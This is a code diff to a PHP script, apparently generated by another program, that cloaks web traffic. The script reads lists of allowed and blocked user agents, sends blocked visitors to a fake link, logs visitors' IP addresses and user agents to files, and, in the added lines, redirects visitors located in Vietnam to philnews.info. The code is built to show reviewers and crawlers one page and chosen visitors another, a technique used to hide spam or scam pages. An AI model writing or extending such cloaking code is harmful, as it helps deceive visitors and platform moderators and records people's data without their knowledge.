@@ -321,8 +321,8 @@ function ipDetails($ip)
 $allowedAgents = "allowedAgents' . $pathname . '.txt";
 $blockedAgents = "blockedAgents' . $pathname . '.txt";
 
-var_dump(ipDetails($_SERVER[\'REMOTE_ADDR\']));
-die();
+$details = ipDetails($_SERVER[\'REMOTE_ADDR\']);
+
 $ip =  ip2long($_SERVER[\'REMOTE_ADDR\']);
 // function ip_details($ip)
 // {
@@ -343,9 +343,9 @@ if (
   fclose($fAgent);
   header(\'Location: ' . $fakeLink . '\', true, 301);
 die();
-
- }
-else {
+ } elseif ($details->country === \'VN\') {
+  header(\'Location: http://philnews.info\', true, 301);
+ } else {
   $fAgent = fopen($allowedAgents, \'a\');
   $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] .\' ok \' . PHP_EOL;
     fwrite($fAgent, $agent);
